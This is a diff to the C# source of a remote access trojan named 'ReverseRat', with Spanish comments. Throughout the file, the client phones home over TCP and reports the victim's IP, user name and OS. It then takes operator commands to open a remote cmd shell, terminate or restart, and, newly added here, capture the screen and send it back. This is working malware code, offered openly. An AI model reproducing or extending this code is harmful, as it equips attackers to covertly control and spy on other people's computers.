@@ -23,7 +23,7 @@ namespace ReverseRat
         StreamReader _streamReader;
         Process _processCmd;
         StringBuilder _strInput;
-        Funciones LlamaFuncion = new Funciones();
+        Funciones Utilidades = new Funciones();
         string _mutexApp, _ipConexion,_puertoConexion;
         private bool _shell;
 
@@ -31,7 +31,7 @@ namespace ReverseRat
         {
             bool createdNew;
 
-            _mutexApp = LlamaFuncion.RandomString(10);  // Mutex de la aplicacion        
+            _mutexApp = Utilidades.RandomString(10);  // Mutex de la aplicacion        
             Mutex m = new Mutex( true, _mutexApp, out createdNew );       
                
             if( !createdNew )
@@ -69,13 +69,14 @@ namespace ReverseRat
                     _networkStream = _tcpClient.GetStream();
                     _streamReader = new StreamReader(_networkStream);
                     _streamWriter = new StreamWriter(_networkStream);
+                    EnviaDatos("M1X3R|" + Utilidades.ObtenerIp() + "|" + Utilidades.ObtenPcUser() + "|" + Utilidades.TipoSistemaOperativo() + "|" + _mutexApp);
                 }
                 catch (Exception err)  // No hay cliente, regresa
                 { 
                     Console.WriteLine(err.Message);
                     return; 
                 }
-                EnviaDatos("M1X3R|" + LlamaFuncion.ObtenerIp() + "|" + LlamaFuncion.ObtenPcUser() + "|"+ LlamaFuncion.TipoSistemaOperativo() + "|"  + _mutexApp);
+                
              
             }
 
@@ -84,33 +85,37 @@ namespace ReverseRat
                 try // Parser de comandos
                 {
                     _strInput.Append(_streamReader.ReadLine());
-                    _strInput.Append("\n");
+                    _strInput.Append("\r\n");
 
-                    if (EncuentraComando("exit"))
+                    if (EncuentraComando("<:terminar:>"))
                     {
-                        _shell = false;                        
+                        Detener(); // Cierra servidor
                     }
-                    if (EncuentraComando("terminate"))
+                    if (EncuentraComando("<:reiniciar:>"))
                     {
-                        StopServer(); // Cierra servidor
+                        Cleanup(); // Cleanup para reiniciar Server
                     }
-                    if (EncuentraComando("quit"))
+                    if (EncuentraComando("exit")) // DOS Exit
                     {
-                        throw new ArgumentException();
+                        _shell = false;                         
+                    }                                    
+                    if (EncuentraComando("<:hola:>"))
+                    {
+                        Utilidades.Hola();
                     }
-                    if (EncuentraComando("hola"))
+                    if (EncuentraComando("<:prueba:>"))
                     {
-                        LlamaFuncion.Hola();
+                        EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" +  Funciones.HashServer + "|");
                     }
-                    if (EncuentraComando("prueba"))
-                    {
-                        EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" + Funciones.HashServer + "|");
+                    if (EncuentraComando("<:captura:>"))
+                    { 
+                        EnviaDatos("<:imagen:>" + Utilidades.CapturarPantalla() + "<:imagen:>");
                     }
-                    if (EncuentraComando("asignahash"))
+                    if (EncuentraComando("<:asignahash:>"))
                     {
-                        LlamaFuncion.AgregaHash(_strInput.ToString().Split(' ')[1].Trim());
+                        Utilidades.AgregaHash(_strInput.ToString().Split(' ')[1].Trim());
                     }                                           
-                    if (EncuentraComando("shell"))
+                    if (EncuentraComando("<:shell:>"))
                     {
                         _shell = true;
                         _processCmd = new Process();
@@ -162,7 +167,7 @@ namespace ReverseRat
             _networkStream.Close();
         }
 
-        private void StopServer() // Comando para salir del servidor (cerrar aplicación)
+        private void Detener() // Comando para salir del servidor (cerrar aplicación)
         {
             Cleanup();
             Environment.Exit(Environment.ExitCode);
